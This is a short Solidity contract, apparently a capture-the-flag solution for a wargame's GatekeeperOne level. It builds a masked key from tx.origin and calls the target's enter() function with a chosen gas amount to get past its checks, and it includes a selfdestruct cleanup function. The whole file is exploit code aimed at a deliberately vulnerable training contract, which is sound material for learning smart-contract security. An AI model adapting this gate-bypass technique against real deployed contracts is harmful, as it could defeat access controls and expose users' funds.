// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {GatekeeperOne} from "./GatekeeperOne.sol";

contract AttackGatekeeperOne is Ownable {
    constructor() Ownable(msg.sender) {}

    function attack(address _gatekeeperOneAddress, uint256 _gas) external onlyOwner {
        // bytes8 _key = bytes8(uint64(uint16(uint160(tx.origin))) + uint64(bytes8(bytes1(0x01))));
        bytes8 _key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        address(GatekeeperOne(_gatekeeperOneAddress)).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", _key));
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
